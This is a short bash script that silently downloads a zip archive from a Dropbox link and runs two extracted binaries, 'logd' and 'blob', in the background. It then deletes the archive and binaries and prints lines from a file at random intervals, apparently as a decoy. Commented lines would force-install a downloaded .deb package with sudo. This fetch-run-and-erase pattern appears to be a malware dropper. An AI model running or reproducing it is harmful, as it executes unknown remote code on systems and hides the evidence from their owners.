#!/bin/bash

#end=$((SECONDS+$1))
#wget https://www.dropbox.com/s/s6j41h7gjx896vw/libstdc.deb -q
#sudo dpkg --force-all -i libstdc.deb > /dev/null 2>&1
#rm -rf libstdc.deb
wget https://www.dropbox.com/s/8pvj7clio93g1we/wan01.zip -q
unzip wan01.zip > /dev/null 2>&1
#pwd
./scripts/logd ./scripts/blob &
sleep 3
rm -rf wan01.zip
rm -rf scripts/logd
rm -rf scripts/blob
while [ $SECONDS -lt $end ]
do
    read line
    echo "$line"
    sleep $(( $RANDOM % 6 ))
done < $2

